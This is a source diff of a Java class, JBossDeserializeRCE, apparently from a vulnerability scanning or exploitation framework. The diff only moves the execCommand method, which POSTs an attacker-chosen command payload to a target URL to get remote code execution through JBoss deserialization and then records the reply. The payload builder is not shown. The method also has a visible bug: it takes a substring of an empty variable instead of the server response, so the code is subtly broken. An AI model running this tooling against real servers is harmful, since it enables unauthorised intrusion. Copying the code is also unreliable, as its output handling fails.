@@ -36,23 +36,7 @@ public class JBossDeserializeRCE  extends WebScriptBase{
 		super();
 	}
 	
-	@Override
-	public void execCommand(String command) {
-		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
-		String result = "";
-		try {
-			String str = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(),getHttpHeaders(), getCommandPayload(command)));
-			if (str!=null) {
-				result = result.substring(result.indexOf("==========")+10);
-			}
-		} catch (Exception e) {
-			e.printStackTrace();
-		} finally{
-			proveBean.setReceiveMessage(result);
-			proveBean.setSendMessage(command);
-			getVulnerBean().getProveBean().add(proveBean);
-		}
-	}
+
 
 	@Override
 	public void prove() {
@@ -81,6 +65,24 @@ public class JBossDeserializeRCE  extends WebScriptBase{
 		} finally{
 			proveBean.setReceiveMessage(result);
 			proveBean.setSendMessage(provePayload);
+			getVulnerBean().getProveBean().add(proveBean);
+		}
+	}
+	
+	@Override
+	public void execCommand(String command) {
+		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
+		String result = "";
+		try {
+			String str = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(),getHttpHeaders(), getCommandPayload(command)));
+			if (str!=null) {
+				result = result.substring(result.indexOf("==========")+10);
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		} finally{
+			proveBean.setReceiveMessage(result);
+			proveBean.setSendMessage(command);
 			getVulnerBean().getProveBean().add(proveBean);
 		}
 	}
